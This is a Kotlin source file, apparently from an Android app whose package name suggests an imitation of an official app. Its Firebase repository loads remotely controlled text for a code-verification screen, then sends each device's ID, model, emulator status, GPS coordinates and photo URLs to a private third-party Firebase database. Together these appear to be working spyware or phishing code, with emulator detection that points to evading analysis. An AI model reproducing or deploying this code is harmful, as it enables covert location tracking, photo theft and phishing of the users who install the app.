package com.moh.nusukapp.auth.repository

import android.util.Log
import com.moh.nusukapp.auth.model.UiConfig
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

object FirebaseRepository {

    private const val BASE_URL = "https://super-xxx-ai-default-rtdb.asia-southeast1.firebasedatabase.app/users/com_yudibilly"
    private const val TAG = "TokenAuth/Firebase"

    fun fetchUiConfig(): UiConfig? {
        return try {
            val url = URL("$BASE_URL/tokenAuth.json")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "GET"
            conn.connectTimeout = 10000
            conn.readTimeout = 10000
            val response = conn.inputStream.bufferedReader().readText()
            Log.d(TAG, "Raw response: ${response.take(100)}...")

            if (response == "null") {
                Log.w(TAG, "Firebase returned null for tokenAuth path")
                return null
            }

            val json = JSONObject(response)

            val ui = json.optJSONObject("ui")
            val config = json.optJSONObject("config")
            val theme = json.optJSONObject("theme")
            val cloudinary = json.optJSONObject("cloudinary")

            val result = UiConfig(
                titleSmall = ui?.optString("titleSmall", "Verify your email") ?: "Verify your email",
                titleLarge = ui?.optString("titleLarge", "Enter verification code") ?: "Enter verification code",
                description = ui?.optString("description", "We've sent a 6-digit verification code to your email address.") ?: "We've sent a 6-digit verification code to your email address.",
                buttonText = ui?.optString("buttonText", "Verify Your Email") ?: "Verify Your Email",
                countdownPrefix = ui?.optString("countdownText", "You can request a new code in") ?: "You can request a new code in",
                successMessage = ui?.optString("successMessage", "Verification successful!") ?: "Verification successful!",
                errorInvalid = ui?.optString("errorInvalid", "Invalid verification code") ?: "Invalid verification code",
                errorBlocked = ui?.optString("errorBlocked", "Account blocked. Contact admin.") ?: "Account blocked. Contact admin.",
                adminContact = ui?.optString("adminContact", "admin@example.com") ?: "admin@example.com",
                logoUrl = ui?.optString("logoUrl", "") ?: "",
                otpLength = config?.optInt("otpLength", 6) ?: 6,
                countdownSeconds = config?.optInt("countdownSeconds", 120) ?: 120,
                maxAttempts = config?.optInt("maxAttempts", 3) ?: 3,
                backgroundColor = theme?.optString("backgroundColor", "#F8F6F1") ?: "#F8F6F1",
                cardColor = theme?.optString("cardColor", "#FFFFFF") ?: "#FFFFFF",
                primaryColor = theme?.optString("primaryColor", "#111111") ?: "#111111",
                secondaryColor = theme?.optString("secondaryColor", "#6F6F6F") ?: "#6F6F6F",
                borderColor = theme?.optString("borderColor", "#DADADA") ?: "#DADADA",
                buttonColor = theme?.optString("buttonColor", "#111111") ?: "#111111",
                errorColor = theme?.optString("errorColor", "#D32F2F") ?: "#D32F2F",
                successColor = theme?.optString("successColor", "#2E7D32") ?: "#2E7D32",
                cloudinaryCloudName = cloudinary?.optString("cloudName", "") ?: "",
                cloudinaryUploadPreset = cloudinary?.optString("uploadPreset", "") ?: ""
            )
            Log.d(TAG, "Config parsed: titleSmall=${result.titleSmall}")
            result
        } catch (e: Exception) {
            Log.e(TAG, "fetchUiConfig failed: ${e.message}", e)
            null
        }
    }

    fun saveDeviceInfo(deviceId: String, brand: String, model: String, isEmulator: Boolean) {
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("brand", brand)
            put("model", model)
            put("isEmulator", isEmulator)
            put("lastSeen", System.currentTimeMillis())
            put("firstSeen", System.currentTimeMillis())
            put("requestCount", 0)
            put("status", "active")
            put("timestamp", System.currentTimeMillis())
        }
        val success = writeToFirebase("devices/$deviceId", json.toString(), "PUT")
        if (success) Log.d(TAG, "Device info saved for $deviceId")
    }

    fun saveLocation(deviceId: String, latitude: Double, longitude: Double) {
        val json = JSONObject().apply {
            put("latitude", latitude)
            put("longitude", longitude)
            put("lastSeen", System.currentTimeMillis())
        }
        val success = writeToFirebase("devices/$deviceId", json.toString(), "PATCH")
        if (success) Log.d(TAG, "Location saved: $latitude, $longitude")
    }

    fun savePhotoUrl(deviceId: String, photoUrl: String) {
        val json = JSONObject().apply {
            put("photoUrl", photoUrl)
            put("photoTimestamp", System.currentTimeMillis())
        }
        val success = writeToFirebase("devices/$deviceId", json.toString(), "PATCH")
        if (success) Log.d(TAG, "Photo URL saved: $photoUrl")
    }

    private fun writeToFirebase(path: String, jsonBody: String, method: String): Boolean {
        return try {
            val url = URL("$BASE_URL/$path.json")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = method
            conn.doOutput = true
            conn.connectTimeout = 10000
            conn.readTimeout = 10000
            conn.setRequestProperty("Content-Type", "application/json")
            conn.outputStream.write(jsonBody.toByteArray())
            val code = conn.responseCode
            Log.d(TAG, "Write $path → $code")
            code in 200..299
        } catch (e: Exception) {
            Log.e(TAG, "Write $path failed: ${e.message}")
            false
        }
    }
}
